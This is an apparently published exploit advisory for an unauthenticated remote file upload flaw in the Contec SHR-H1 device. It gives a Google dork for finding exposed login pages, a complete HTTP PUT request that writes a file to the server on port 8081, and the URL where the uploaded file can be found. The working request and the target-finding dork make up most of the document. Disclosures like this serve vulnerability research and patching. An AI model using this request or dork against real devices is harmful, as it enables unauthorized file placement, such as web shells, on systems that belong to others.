# Exploit Title: SHR-H1 remote file upload
# Google Dork : intitle:"Login to SHR-H1"
# Date: 2022-05-30
# Exploit Author: Ahmed Alroky
# Author Company : AIactive
# Version: 1.0.0
# Vendor home page : https://www.contec.com/
# Authentication Required: No

# Tested on: Windows


# Exploit
# HTTP Request :

```
PUT /POC.txt HTTP/1.1
Host: HOST_IP:8081
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Length: 7

testttt
```

find uploaded file at http://HOST_IP:8081/POC.txt